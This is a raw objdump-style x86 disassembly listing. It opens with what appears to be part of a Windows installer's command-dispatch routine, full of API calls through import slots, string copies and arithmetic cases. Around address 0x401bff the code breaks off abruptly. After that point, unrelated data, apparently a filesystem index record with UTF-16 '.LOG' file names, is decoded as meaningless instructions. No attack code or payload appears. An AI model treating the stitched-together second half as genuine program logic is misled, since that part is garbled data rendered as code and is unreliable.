  4016d5:	8b f0                	mov    %eax,%esi
  4016d7:	8d 45 08             	lea    0x8(%ebp),%eax
  4016da:	50                   	push   %eax
  4016db:	57                   	push   %edi
  4016dc:	68 00 04 00 00       	push   $0x400
  4016e1:	56                   	push   %esi
  4016e2:	ff 15 0c 81 40 00    	call   *0x40810c
  4016e8:	85 c0                	test   %eax,%eax
  4016ea:	74 24                	je     0x401710
  4016ec:	8b 45 08             	mov    0x8(%ebp),%eax
  4016ef:	3b c6                	cmp    %esi,%eax
  4016f1:	76 27                	jbe    0x40171a
  4016f3:	66 39 18             	cmp    %bx,(%eax)
  4016f6:	74 22                	je     0x40171a
  4016f8:	56                   	push   %esi
  4016f9:	e8 74 4f 00 00       	call   0x406672
  4016fe:	3b c3                	cmp    %ebx,%eax
  401700:	74 0e                	je     0x401710
  401702:	83 c0 2c             	add    $0x2c,%eax
  401705:	50                   	push   %eax
  401706:	ff 75 08             	push   0x8(%ebp)
  401709:	e8 21 4c 00 00       	call   0x40632f
  40170e:	eb 0a                	jmp    0x40171a
  401710:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  401717:	66 89 1f             	mov    %bx,(%edi)
  40171a:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  40171d:	0f 85 0f 14 00 00    	jne    0x402b32
  401723:	68 00 04 00 00       	push   $0x400
  401728:	57                   	push   %edi
  401729:	57                   	push   %edi
  40172a:	ff 15 10 81 40 00    	call   *0x408110
  401730:	e9 fd 13 00 00       	jmp    0x402b32
  401735:	6a ff                	push   $0xffffffff
  401737:	e8 72 15 00 00       	call   0x402cae
  40173c:	8d 4d 08             	lea    0x8(%ebp),%ecx
  40173f:	51                   	push   %ecx
  401740:	56                   	push   %esi
  401741:	68 00 04 00 00       	push   $0x400
  401746:	53                   	push   %ebx
  401747:	50                   	push   %eax
  401748:	53                   	push   %ebx
  401749:	ff 15 14 81 40 00    	call   *0x408114
  40174f:	85 c0                	test   %eax,%eax
  401751:	0f 85 db 13 00 00    	jne    0x402b32
  401757:	e9 6a 11 00 00       	jmp    0x4028c6
  40175c:	6a ef                	push   $0xffffffef
  40175e:	e8 4b 15 00 00       	call   0x402cae
  401763:	50                   	push   %eax
  401764:	56                   	push   %esi
  401765:	e8 ea 46 00 00       	call   0x405e54
  40176a:	e9 45 fe ff ff       	jmp    0x4015b4
  40176f:	6a 31                	push   $0x31
  401771:	e8 38 15 00 00       	call   0x402cae
  401776:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401779:	8b 45 d0             	mov    -0x30(%ebp),%eax
  40177c:	ff 75 f8             	push   -0x8(%ebp)
  40177f:	83 e0 07             	and    $0x7,%eax
  401782:	89 45 08             	mov    %eax,0x8(%ebp)
  401785:	e8 f1 44 00 00       	call   0x405c7b
  40178a:	ff 75 f8             	push   -0x8(%ebp)
  40178d:	be d0 a5 40 00       	mov    $0x40a5d0,%esi
  401792:	85 c0                	test   %eax,%eax
  401794:	74 08                	je     0x40179e
  401796:	56                   	push   %esi
  401797:	e8 93 4b 00 00       	call   0x40632f
  40179c:	eb 17                	jmp    0x4017b5
  40179e:	68 00 00 44 00       	push   $0x440000
  4017a3:	56                   	push   %esi
  4017a4:	e8 86 4b 00 00       	call   0x40632f
  4017a9:	50                   	push   %eax
  4017aa:	e8 55 44 00 00       	call   0x405c04
  4017af:	50                   	push   %eax
  4017b0:	e8 96 4b 00 00       	call   0x40634b
  4017b5:	56                   	push   %esi
  4017b6:	e8 08 4e 00 00       	call   0x4065c3
  4017bb:	83 7d 08 03          	cmpl   $0x3,0x8(%ebp)
  4017bf:	7c 31                	jl     0x4017f2
  4017c1:	56                   	push   %esi
  4017c2:	e8 ab 4e 00 00       	call   0x406672
  4017c7:	33 c9                	xor    %ecx,%ecx
  4017c9:	3b c3                	cmp    %ebx,%eax
  4017cb:	74 10                	je     0x4017dd
  4017cd:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  4017d0:	83 c0 14             	add    $0x14,%eax
  4017d3:	51                   	push   %ecx
  4017d4:	50                   	push   %eax
  4017d5:	ff 15 18 81 40 00    	call   *0x408118
  4017db:	8b c8                	mov    %eax,%ecx
  4017dd:	8b 45 08             	mov    0x8(%ebp),%eax
  4017e0:	83 c0 fd             	add    $0xfffffffd,%eax
  4017e3:	0d 00 00 00 80       	or     $0x80000000,%eax
  4017e8:	23 c1                	and    %ecx,%eax
  4017ea:	f7 d8                	neg    %eax
  4017ec:	1b c0                	sbb    %eax,%eax
  4017ee:	40                   	inc    %eax
  4017ef:	89 45 08             	mov    %eax,0x8(%ebp)
  4017f2:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  4017f5:	75 06                	jne    0x4017fd
  4017f7:	56                   	push   %esi
  4017f8:	e8 03 46 00 00       	call   0x405e00
  4017fd:	33 c0                	xor    %eax,%eax
  4017ff:	83 7d 08 01          	cmpl   $0x1,0x8(%ebp)
  401803:	0f 95 c0             	setne  %al
  401806:	40                   	inc    %eax
  401807:	50                   	push   %eax
  401808:	68 00 00 00 40       	push   $0x40000000
  40180d:	56                   	push   %esi
  40180e:	e8 12 46 00 00       	call   0x405e25
  401813:	83 f8 ff             	cmp    $0xffffffff,%eax
  401816:	89 45 c8             	mov    %eax,-0x38(%ebp)
  401819:	75 72                	jne    0x40188d
  40181b:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  40181e:	75 4f                	jne    0x40186f
  401820:	57                   	push   %edi
  401821:	68 d0 b5 40 00       	push   $0x40b5d0
  401826:	e8 04 4b 00 00       	call   0x40632f
  40182b:	56                   	push   %esi
  40182c:	57                   	push   %edi
  40182d:	e8 fd 4a 00 00       	call   0x40632f
  401832:	ff 75 e4             	push   -0x1c(%ebp)
  401835:	68 d0 ad 40 00       	push   $0x40add0
  40183a:	e8 12 4b 00 00       	call   0x406351
  40183f:	68 d0 b5 40 00       	push   $0x40b5d0
  401844:	57                   	push   %edi
  401845:	e8 e5 4a 00 00       	call   0x40632f
  40184a:	8b 45 d0             	mov    -0x30(%ebp),%eax
  40184d:	c1 f8 03             	sar    $0x3,%eax
  401850:	50                   	push   %eax
  401851:	68 d0 ad 40 00       	push   $0x40add0
  401856:	e8 3a 41 00 00       	call   0x405995
  40185b:	83 e8 04             	sub    $0x4,%eax
  40185e:	0f 84 57 ff ff ff    	je     0x4017bb
  401864:	48                   	dec    %eax
  401865:	74 1b                	je     0x401882
  401867:	56                   	push   %esi
  401868:	6a fa                	push   $0xfffffffa
  40186a:	e9 24 fc ff ff       	jmp    0x401493
  40186f:	ff 75 f8             	push   -0x8(%ebp)
  401872:	6a e2                	push   $0xffffffe2
  401874:	e8 1e 3b 00 00       	call   0x405397
  401879:	83 7d 08 02          	cmpl   $0x2,0x8(%ebp)
  40187d:	e9 34 fd ff ff       	jmp    0x4015b6
  401882:	ff 05 88 4f 43 00    	incl   0x434f88
  401888:	e9 ae 12 00 00       	jmp    0x402b3b
  40188d:	ff 75 f8             	push   -0x8(%ebp)
  401890:	6a ea                	push   $0xffffffea
  401892:	e8 00 3b 00 00       	call   0x405397
  401897:	ff 05 b4 4f 43 00    	incl   0x434fb4
  40189d:	53                   	push   %ebx
  40189e:	53                   	push   %ebx
  40189f:	ff 75 c8             	push   -0x38(%ebp)
  4018a2:	ff 75 d8             	push   -0x28(%ebp)
  4018a5:	e8 d7 18 00 00       	call   0x403181
  4018aa:	ff 0d b4 4f 43 00    	decl   0x434fb4
  4018b0:	83 7d dc ff          	cmpl   $0xffffffff,-0x24(%ebp)
  4018b4:	8b f8                	mov    %eax,%edi
  4018b6:	75 06                	jne    0x4018be
  4018b8:	83 7d e0 ff          	cmpl   $0xffffffff,-0x20(%ebp)
  4018bc:	74 12                	je     0x4018d0
  4018be:	8d 45 dc             	lea    -0x24(%ebp),%eax
  4018c1:	50                   	push   %eax
  4018c2:	8d 45 dc             	lea    -0x24(%ebp),%eax
  4018c5:	53                   	push   %ebx
  4018c6:	50                   	push   %eax
  4018c7:	ff 75 c8             	push   -0x38(%ebp)
  4018ca:	ff 15 1c 81 40 00    	call   *0x40811c
  4018d0:	ff 75 c8             	push   -0x38(%ebp)
  4018d3:	ff 15 20 81 40 00    	call   *0x408120
  4018d9:	3b fb                	cmp    %ebx,%edi
  4018db:	0f 8d 51 12 00 00    	jge    0x402b32
  4018e1:	83 ff fe             	cmp    $0xfffffffe,%edi
  4018e4:	75 13                	jne    0x4018f9
  4018e6:	6a e9                	push   $0xffffffe9
  4018e8:	56                   	push   %esi
  4018e9:	e8 63 4a 00 00       	call   0x406351
  4018ee:	ff 75 f8             	push   -0x8(%ebp)
  4018f1:	56                   	push   %esi
  4018f2:	e8 54 4a 00 00       	call   0x40634b
  4018f7:	eb 08                	jmp    0x401901
  4018f9:	6a ee                	push   $0xffffffee
  4018fb:	56                   	push   %esi
  4018fc:	e8 50 4a 00 00       	call   0x406351
  401901:	68 10 00 20 00       	push   $0x200010
  401906:	56                   	push   %esi
  401907:	e9 53 0a 00 00       	jmp    0x40235f
  40190c:	53                   	push   %ebx
  40190d:	eb 34                	jmp    0x401943
  40190f:	6a 31                	push   $0x31
  401911:	e8 98 13 00 00       	call   0x402cae
  401916:	ff 75 d0             	push   -0x30(%ebp)
  401919:	50                   	push   %eax
  40191a:	e8 76 40 00 00       	call   0x405995
  40191f:	3b c3                	cmp    %ebx,%eax
  401921:	0f 84 d1 0f 00 00    	je     0x4028f8
  401927:	3b 45 d8             	cmp    -0x28(%ebp),%eax
  40192a:	0f 84 6c 01 00 00    	je     0x401a9c
  401930:	3b 45 e0             	cmp    -0x20(%ebp),%eax
  401933:	0f 85 f9 11 00 00    	jne    0x402b32
  401939:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  40193c:	e9 fc 11 00 00       	jmp    0x402b3d
  401941:	6a f0                	push   $0xfffffff0
  401943:	e8 66 13 00 00       	call   0x402cae
  401948:	ff 75 d4             	push   -0x2c(%ebp)
  40194b:	50                   	push   %eax
  40194c:	e8 f0 40 00 00       	call   0x405a41
  401951:	e9 dc 11 00 00       	jmp    0x402b32
  401956:	6a 01                	push   $0x1
  401958:	e8 51 13 00 00       	call   0x402cae
  40195d:	50                   	push   %eax
  40195e:	e8 e2 49 00 00       	call   0x406345
  401963:	e9 97 0c 00 00       	jmp    0x4025ff
  401968:	6a 02                	push   $0x2
  40196a:	e8 1d 13 00 00       	call   0x402c8c
  40196f:	6a 03                	push   $0x3
  401971:	89 45 f0             	mov    %eax,-0x10(%ebp)
  401974:	89 55 f4             	mov    %edx,-0xc(%ebp)
  401977:	e8 10 13 00 00       	call   0x402c8c
  40197c:	59                   	pop    %ecx
  40197d:	8b f8                	mov    %eax,%edi
  40197f:	8b 45 f0             	mov    -0x10(%ebp),%eax
  401982:	59                   	pop    %ecx
  401983:	6a 01                	push   $0x1
  401985:	89 7d c4             	mov    %edi,-0x3c(%ebp)
  401988:	89 55 c8             	mov    %edx,-0x38(%ebp)
  40198b:	89 45 08             	mov    %eax,0x8(%ebp)
  40198e:	e8 1b 13 00 00       	call   0x402cae
  401993:	50                   	push   %eax
  401994:	89 45 bc             	mov    %eax,-0x44(%ebp)
  401997:	e8 a9 49 00 00       	call   0x406345
  40199c:	39 5d f4             	cmp    %ebx,-0xc(%ebp)
  40199f:	66 89 1e             	mov    %bx,(%esi)
  4019a2:	75 03                	jne    0x4019a7
  4019a4:	89 45 08             	mov    %eax,0x8(%ebp)
  4019a7:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  4019aa:	0f 84 82 11 00 00    	je     0x402b32
  4019b0:	8b 4d c4             	mov    -0x3c(%ebp),%ecx
  4019b3:	3b cb                	cmp    %ebx,%ecx
  4019b5:	7d 0b                	jge    0x4019c2
  4019b7:	8d 3c 08             	lea    (%eax,%ecx,1),%edi
  4019ba:	3b fb                	cmp    %ebx,%edi
  4019bc:	0f 8c 70 11 00 00    	jl     0x402b32
  4019c2:	3b f8                	cmp    %eax,%edi
  4019c4:	7e 02                	jle    0x4019c8
  4019c6:	8b f8                	mov    %eax,%edi
  4019c8:	8b 45 bc             	mov    -0x44(%ebp),%eax
  4019cb:	8d 04 78             	lea    (%eax,%edi,2),%eax
  4019ce:	50                   	push   %eax
  4019cf:	56                   	push   %esi
  4019d0:	e8 5a 49 00 00       	call   0x40632f
  4019d5:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  4019d8:	7d 0e                	jge    0x4019e8
  4019da:	56                   	push   %esi
  4019db:	e8 65 49 00 00       	call   0x406345
  4019e0:	01 45 08             	add    %eax,0x8(%ebp)
  4019e3:	79 03                	jns    0x4019e8
  4019e5:	89 5d 08             	mov    %ebx,0x8(%ebp)
  4019e8:	8b 45 08             	mov    0x8(%ebp),%eax
  4019eb:	3d 00 04 00 00       	cmp    $0x400,%eax
  4019f0:	0f 8d 3c 11 00 00    	jge    0x402b32
  4019f6:	66 89 1c 46          	mov    %bx,(%esi,%eax,2)
  4019fa:	e9 33 11 00 00       	jmp    0x402b32
  4019ff:	6a 20                	push   $0x20
  401a01:	e8 a8 12 00 00       	call   0x402cae
  401a06:	6a 31                	push   $0x31
  401a08:	8b f0                	mov    %eax,%esi
  401a0a:	e8 9f 12 00 00       	call   0x402cae
  401a0f:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  401a12:	50                   	push   %eax
  401a13:	56                   	push   %esi
  401a14:	75 12                	jne    0x401a28
  401a16:	ff 15 04 81 40 00    	call   *0x408104
  401a1c:	85 c0                	test   %eax,%eax
  401a1e:	75 7c                	jne    0x401a9c
  401a20:	8b 45 d8             	mov    -0x28(%ebp),%eax
  401a23:	e9 15 11 00 00       	jmp    0x402b3d
  401a28:	ff 15 08 81 40 00    	call   *0x408108
  401a2e:	eb ec                	jmp    0x401a1c
  401a30:	33 ff                	xor    %edi,%edi
  401a32:	47                   	inc    %edi
  401a33:	57                   	push   %edi
  401a34:	e8 75 12 00 00       	call   0x402cae
  401a39:	68 00 04 00 00       	push   $0x400
  401a3e:	56                   	push   %esi
  401a3f:	50                   	push   %eax
  401a40:	89 45 08             	mov    %eax,0x8(%ebp)
  401a43:	ff 15 24 81 40 00    	call   *0x408124
  401a49:	85 c0                	test   %eax,%eax
  401a4b:	74 13                	je     0x401a60
  401a4d:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  401a50:	74 14                	je     0x401a66
  401a52:	56                   	push   %esi
  401a53:	ff 75 08             	push   0x8(%ebp)
  401a56:	ff 15 08 81 40 00    	call   *0x408108
  401a5c:	85 c0                	test   %eax,%eax
  401a5e:	75 06                	jne    0x401a66
  401a60:	89 7d fc             	mov    %edi,-0x4(%ebp)
  401a63:	66 89 1e             	mov    %bx,(%esi)
  401a66:	66 89 9e fe 07 00 00 	mov    %bx,0x7fe(%esi)
  401a6d:	e9 c0 10 00 00       	jmp    0x402b32
  401a72:	8b 75 e4             	mov    -0x1c(%ebp),%esi
  401a75:	53                   	push   %ebx
  401a76:	e8 11 12 00 00       	call   0x402c8c
  401a7b:	6a 01                	push   $0x1
  401a7d:	8b f8                	mov    %eax,%edi
  401a7f:	89 55 f4             	mov    %edx,-0xc(%ebp)
  401a82:	e8 05 12 00 00       	call   0x402c8c
  401a87:	59                   	pop    %ecx
  401a88:	3b f3                	cmp    %ebx,%esi
  401a8a:	59                   	pop    %ecx
  401a8b:	89 55 f4             	mov    %edx,-0xc(%ebp)
  401a8e:	75 08                	jne    0x401a98
  401a90:	3b f8                	cmp    %eax,%edi
  401a92:	7c 08                	jl     0x401a9c
  401a94:	7e 8a                	jle    0x401a20
  401a96:	eb 12                	jmp    0x401aaa
  401a98:	3b f8                	cmp    %eax,%edi
  401a9a:	73 08                	jae    0x401aa4
  401a9c:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401a9f:	e9 99 10 00 00       	jmp    0x402b3d
  401aa4:	0f 86 76 ff ff ff    	jbe    0x401a20
  401aaa:	8b 45 e0             	mov    -0x20(%ebp),%eax
  401aad:	e9 8b 10 00 00       	jmp    0x402b3d
  401ab2:	6a 01                	push   $0x1
  401ab4:	e8 d3 11 00 00       	call   0x402c8c
  401ab9:	8b f8                	mov    %eax,%edi
  401abb:	6a 02                	push   $0x2
  401abd:	89 55 f4             	mov    %edx,-0xc(%ebp)
  401ac0:	89 7d 08             	mov    %edi,0x8(%ebp)
  401ac3:	e8 c4 11 00 00       	call   0x402c8c
  401ac8:	59                   	pop    %ecx
  401ac9:	89 55 f4             	mov    %edx,-0xc(%ebp)
  401acc:	59                   	pop    %ecx
  401acd:	8b c8                	mov    %eax,%ecx
  401acf:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401ad2:	83 f8 0d             	cmp    $0xd,%eax
  401ad5:	77 73                	ja     0x401b4a
  401ad7:	ff 24 85 54 2c 40 00 	jmp    *0x402c54(,%eax,4)
  401ade:	03 f9                	add    %ecx,%edi
  401ae0:	eb 6b                	jmp    0x401b4d
  401ae2:	2b f9                	sub    %ecx,%edi
  401ae4:	eb 67                	jmp    0x401b4d
  401ae6:	0f af cf             	imul   %edi,%ecx
  401ae9:	eb 17                	jmp    0x401b02
  401aeb:	3b cb                	cmp    %ebx,%ecx
  401aed:	74 44                	je     0x401b33
  401aef:	8b c7                	mov    %edi,%eax
  401af1:	99                   	cltd
  401af2:	f7 f9                	idiv   %ecx
  401af4:	8b f8                	mov    %eax,%edi
  401af6:	eb 55                	jmp    0x401b4d
  401af8:	0b cf                	or     %edi,%ecx
  401afa:	eb 06                	jmp    0x401b02
  401afc:	23 cf                	and    %edi,%ecx
  401afe:	eb 02                	jmp    0x401b02
  401b00:	33 cf                	xor    %edi,%ecx
  401b02:	8b f9                	mov    %ecx,%edi
  401b04:	eb 47                	jmp    0x401b4d
  401b06:	33 c0                	xor    %eax,%eax
  401b08:	3b fb                	cmp    %ebx,%edi
  401b0a:	0f 94 c0             	sete   %al
  401b0d:	eb e5                	jmp    0x401af4
  401b0f:	3b fb                	cmp    %ebx,%edi
  401b11:	75 0e                	jne    0x401b21
  401b13:	eb 08                	jmp    0x401b1d
  401b15:	33 ff                	xor    %edi,%edi
  401b17:	eb 34                	jmp    0x401b4d
  401b19:	3b fb                	cmp    %ebx,%edi
  401b1b:	74 f8                	je     0x401b15
  401b1d:	3b cb                	cmp    %ebx,%ecx
  401b1f:	74 f4                	je     0x401b15
  401b21:	33 ff                	xor    %edi,%edi
  401b23:	47                   	inc    %edi
  401b24:	eb 27                	jmp    0x401b4d
  401b26:	3b cb                	cmp    %ebx,%ecx
  401b28:	74 09                	je     0x401b33
  401b2a:	8b c7                	mov    %edi,%eax
  401b2c:	99                   	cltd
  401b2d:	f7 f9                	idiv   %ecx
  401b2f:	8b fa                	mov    %edx,%edi
  401b31:	eb 1a                	jmp    0x401b4d
  401b33:	33 ff                	xor    %edi,%edi
  401b35:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  401b3c:	eb 0f                	jmp    0x401b4d
  401b3e:	d3 e7                	shl    %cl,%edi
  401b40:	eb 0b                	jmp    0x401b4d
  401b42:	d3 ff                	sar    %cl,%edi
  401b44:	eb 07                	jmp    0x401b4d
  401b46:	d3 ef                	shr    %cl,%edi
  401b48:	eb 03                	jmp    0x401b4d
  401b4a:	8b 7d 08             	mov    0x8(%ebp),%edi
  401b4d:	57                   	push   %edi
  401b4e:	e9 1a fa ff ff       	jmp    0x40156d
  401b53:	6a 01                	push   $0x1
  401b55:	e8 54 11 00 00       	call   0x402cae
  401b5a:	6a 02                	push   $0x2
  401b5c:	8b f8                	mov    %eax,%edi
  401b5e:	e8 29 11 00 00       	call   0x402c8c
  401b63:	50                   	push   %eax
  401b64:	57                   	push   %edi
  401b65:	56                   	push   %esi
  401b66:	89 55 f4             	mov    %edx,-0xc(%ebp)
  401b69:	ff 15 64 82 40 00    	call   *0x408264
  401b6f:	83 c4 10             	add    $0x10,%esp
  401b72:	e9 bb 0f 00 00       	jmp    0x402b32
  401b77:	8b 45 d8             	mov    -0x28(%ebp),%eax
  401b7a:	8b 3d 30 ce 40 00    	mov    0x40ce30,%edi
  401b80:	3b c3                	cmp    %ebx,%eax
  401b82:	74 44                	je     0x401bc8
  401b84:	48                   	dec    %eax
  401b85:	3b fb                	cmp    %ebx,%edi
  401b87:	0f 84 c4 07 00 00    	je     0x402351
  401b8d:	8b 3f                	mov    (%edi),%edi
  401b8f:	3b c3                	cmp    %ebx,%eax
  401b91:	75 f1                	jne    0x401b84
  401b93:	3b fb                	cmp    %ebx,%edi
  401b95:	0f 84 b6 07 00 00    	je     0x402351
  401b9b:	83 c7 04             	add    $0x4,%edi
  401b9e:	be d0 a5 40 00       	mov    $0x40a5d0,%esi
  401ba3:	57                   	push   %edi
  401ba4:	56                   	push   %esi
  401ba5:	e8 85 47 00 00       	call   0x40632f
  401baa:	a1 30 ce 40 00       	mov    0x40ce30,%eax
  401baf:	83 c0 04             	add    $0x4,%eax
  401bb2:	50                   	push   %eax
  401bb3:	57                   	push   %edi
  401bb4:	e8 76 47 00 00       	call   0x40632f
  401bb9:	a1 30 ce 40 00       	mov    0x40ce30,%eax
  401bbe:	56                   	push   %esi
  401bbf:	83 c0 04             	add    $0x4,%eax
  401bc2:	50                   	push   %eax
  401bc3:	e9 86 0e 00 00       	jmp    0x402a4e
  401bc8:	39 5d d4             	cmp    %ebx,-0x2c(%ebp)
  401bcb:	74 25                	je     0x401bf2
  401bcd:	3b fb                	cmp    %ebx,%edi
  401bcf:	0f 84 23 0d 00 00    	je     0x4028f8
  401bd5:	8d 47 04             	lea    0x4(%edi),%eax
  401bd8:	50                   	push   %eax
  401bd9:	56                   	push   %esi
  401bda:	e8 50 47 00 00       	call   0x40632f
  401bdf:	8b 07                	mov    (%edi),%eax
  401be1:	57                   	push   %edi
  401be2:	a3 30 ce 40 00       	mov    %eax,0x40ce30
  401be7:	ff 15 28 81 40 00    	call   *0x408128
  401bed:	e9 40 0f 00 00       	jmp    0x402b32
  401bf2:	68 04 08 00 00       	push   $0x804
  401bf7:	6a 40                	push   $0x40
  401bf9:	ff 15 34 81 40 00    	call   *0x408134
  401bff:	ff 49 4e             	decl   0x4e(%ecx)
  401c02:	44                   	inc    %esp
  401c03:	58                   	pop    %eax
  401c04:	28 00                	sub    %al,(%eax)
  401c06:	09 00                	or     %eax,(%eax)
  401c08:	74 71                	je     0x401c7b
  401c0a:	07                   	pop    %es
  401c0b:	0a 1c 00             	or     (%eax,%eax,1),%bl
	...
  401c16:	00 00                	add    %al,(%eax)
  401c18:	28 00                	sub    %al,(%eax)
  401c1a:	00 00                	add    %al,(%eax)
  401c1c:	f0 08 00             	lock or %al,(%eax)
  401c1f:	00 e8                	add    %ch,%al
  401c21:	0f 00 00             	sldt   (%eax)
  401c24:	00 00                	add    %al,(%eax)
  401c26:	00 00                	add    %al,(%eax)
  401c28:	b8 00 67 00 00       	mov    $0x6700,%eax
	...
  401c3d:	00 00                	add    %al,(%eax)
  401c3f:	00 95 57 00 00 00    	add    %dl,0x57(%ebp)
  401c45:	00 2c 00             	add    %ch,(%eax,%eax,1)
  401c48:	70 00                	jo     0x401c4a
  401c4a:	5a                   	pop    %edx
  401c4b:	00 00                	add    %al,(%eax)
  401c4d:	00 00                	add    %al,(%eax)
  401c4f:	00 73 8b             	add    %dh,-0x75(%ebx)
  401c52:	01 00                	add    %eax,(%eax)
  401c54:	00 00                	add    %al,(%eax)
  401c56:	0f 00 89 71 22 5f d0 	str    -0x2fa0dd8f(%ecx)
  401c5d:	2f                   	das
  401c5e:	da 01                	fiaddl (%ecx)
  401c60:	db ad 34 78 1d 5e    	fldt   0x5e1d7834(%ebp)
  401c66:	da 01                	fiaddl (%ecx)
  401c68:	5d                   	pop    %ebp
  401c69:	5b                   	pop    %ebx
  401c6a:	6b 64 15 61 da       	imul   $0xffffffda,0x61(%ebp,%edx,1),%esp
  401c6f:	01 db                	add    %ebx,%ebx
  401c71:	ad                   	lods   %ds:(%esi),%eax
  401c72:	34 78                	xor    $0x78,%al
  401c74:	1d 5e da 01 00       	sbb    $0x1da5e,%eax
  401c79:	50                   	push   %eax
  401c7a:	00 00                	add    %al,(%eax)
  401c7c:	00 00                	add    %al,(%eax)
  401c7e:	00 00                	add    %al,(%eax)
  401c80:	60                   	pusha
  401c81:	4a                   	dec    %edx
  401c82:	00 00                	add    %al,(%eax)
  401c84:	00 00                	add    %al,(%eax)
  401c86:	00 00                	add    %al,(%eax)
  401c88:	20 00                	and    %al,(%eax)
  401c8a:	00 00                	add    %al,(%eax)
  401c8c:	00 00                	add    %al,(%eax)
  401c8e:	00 00                	add    %al,(%eax)
  401c90:	0c 02                	or     $0x2,%al
  401c92:	4c                   	dec    %esp
  401c93:	00 41 00             	add    %al,0x0(%ecx)
  401c96:	32 00                	xor    (%eax),%al
  401c98:	31 00                	xor    %eax,(%eax)
  401c9a:	44                   	inc    %esp
  401c9b:	00 46 00             	add    %al,0x0(%esi)
  401c9e:	7e 00                	jle    0x401ca0
  401ca0:	31 00                	xor    %eax,(%eax)
  401ca2:	2e 00 4c 00 4f       	add    %cl,%cs:0x4f(%eax,%eax,1)
  401ca7:	00 47 00             	add    %al,0x0(%edi)
  401caa:	6c                   	insb   (%dx),%es:(%edi)
  401cab:	00 6f 00             	add    %ch,0x0(%edi)
  401cae:	67 00 e1             	addr16 add %ah,%cl
  401cb1:	95                   	xchg   %eax,%ebp
  401cb2:	00 00                	add    %al,(%eax)
  401cb4:	00 00                	add    %al,(%eax)
  401cb6:	c9                   	leave
  401cb7:	00 70 00             	add    %dh,0x0(%eax)
  401cba:	5a                   	pop    %edx
  401cbb:	00 00                	add    %al,(%eax)
  401cbd:	00 00                	add    %al,(%eax)
  401cbf:	00 73 8b             	add    %dh,-0x75(%ebx)
  401cc2:	01 00                	add    %eax,(%eax)
  401cc4:	00 00                	add    %al,(%eax)
  401cc6:	0f 00 89 71 22 5f d0 	str    -0x2fa0dd8f(%ecx)
  401ccd:	2f                   	das
  401cce:	da 01                	fiaddl (%ecx)
  401cd0:	94                   	xchg   %eax,%esp
  401cd1:	47                   	inc    %edi
  401cd2:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  401cd3:	f5                   	cmc
  401cd4:	14 61                	adc    $0x61,%al
  401cd6:	da 01                	fiaddl (%ecx)
  401cd8:	6d                   	insl   (%dx),%es:(%edi)
  401cd9:	82 6b 64 15          	subb   $0x15,0x64(%ebx)
  401cdd:	61                   	popa
  401cde:	da 01                	fiaddl (%ecx)
  401ce0:	94                   	xchg   %eax,%esp
  401ce1:	47                   	inc    %edi
  401ce2:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  401ce3:	f5                   	cmc
  401ce4:	14 61                	adc    $0x61,%al
  401ce6:	da 01                	fiaddl (%ecx)
  401ce8:	00 30                	add    %dh,(%eax)
  401cea:	00 00                	add    %al,(%eax)
  401cec:	00 00                	add    %al,(%eax)
  401cee:	00 00                	add    %al,(%eax)
  401cf0:	e3 25                	jecxz  0x401d17
  401cf2:	00 00                	add    %al,(%eax)
  401cf4:	00 00                	add    %al,(%eax)
  401cf6:	00 00                	add    %al,(%eax)
  401cf8:	20 00                	and    %al,(%eax)
  401cfa:	00 00                	add    %al,(%eax)
  401cfc:	00 00                	add    %al,(%eax)
  401cfe:	00 00                	add    %al,(%eax)
  401d00:	0c 02                	or     $0x2,%al
  401d02:	4c                   	dec    %esp
  401d03:	00 41 00             	add    %al,0x0(%ecx)
  401d06:	33 00                	xor    (%eax),%eax
  401d08:	31 00                	xor    %eax,(%eax)
  401d0a:	33 00                	xor    (%eax),%eax
  401d0c:	33 00                	xor    (%eax),%eax
  401d0e:	7e 00                	jle    0x401d10
  401d10:	31 00                	xor    %eax,(%eax)
  401d12:	2e 00 4c 00 4f       	add    %cl,%cs:0x4f(%eax,%eax,1)
  401d17:	00 47 00             	add    %al,0x0(%edi)
  401d1a:	6c                   	insb   (%dx),%es:(%edi)
  401d1b:	00 6f 00             	add    %ch,0x0(%edi)
  401d1e:	67 00 0d             	add    %cl,(%di)
  401d21:	db 00                	fildl  (%eax)
  401d23:	00 00                	add    %al,(%eax)
  401d25:	00 84 00 70 00 5a 00 	add    %al,0x5a0070(%eax,%eax,1)
  401d2c:	00 00                	add    %al,(%eax)
  401d2e:	00 00                	add    %al,(%eax)
  401d30:	73 8b                	jae    0x401cbd
  401d32:	01 00                	add    %eax,(%eax)
  401d34:	00 00                	add    %al,(%eax)
  401d36:	0f 00 89 71 22 5f d0 	str    -0x2fa0dd8f(%ecx)
  401d3d:	2f                   	das
  401d3e:	da 01                	fiaddl (%ecx)
  401d40:	ca 6a 3a             	lret   $0x3a6a
  401d43:	2d dd 5e da 01       	sub    $0x1da5edd,%eax
  401d48:	6d                   	insl   (%dx),%es:(%edi)
  401d49:	82 6b 64 15          	subb   $0x15,0x64(%ebx)
  401d4d:	61                   	popa
  401d4e:	da 01                	fiaddl (%ecx)
  401d50:	ca 6a 3a             	lret   $0x3a6a
  401d53:	2d dd 5e da 01       	sub    $0x1da5edd,%eax
  401d58:	00 30                	add    %dh,(%eax)
  401d5a:	00 00                	add    %al,(%eax)
  401d5c:	00 00                	add    %al,(%eax)
  401d5e:	00 00                	add    %al,(%eax)
  401d60:	b9 26 00 00 00       	mov    $0x26,%ecx
  401d65:	00 00                	add    %al,(%eax)
  401d67:	00 20                	add    %ah,(%eax)
  401d69:	00 00                	add    %al,(%eax)
  401d6b:	00 00                	add    %al,(%eax)
  401d6d:	00 00                	add    %al,(%eax)
  401d6f:	00 0c 02             	add    %cl,(%edx,%eax,1)
  401d72:	4c                   	dec    %esp
  401d73:	00 41 00             	add    %al,0x0(%ecx)
  401d76:	38 00                	cmp    %al,(%eax)
  401d78:	36 00 36             	add    %dh,%ss:(%esi)
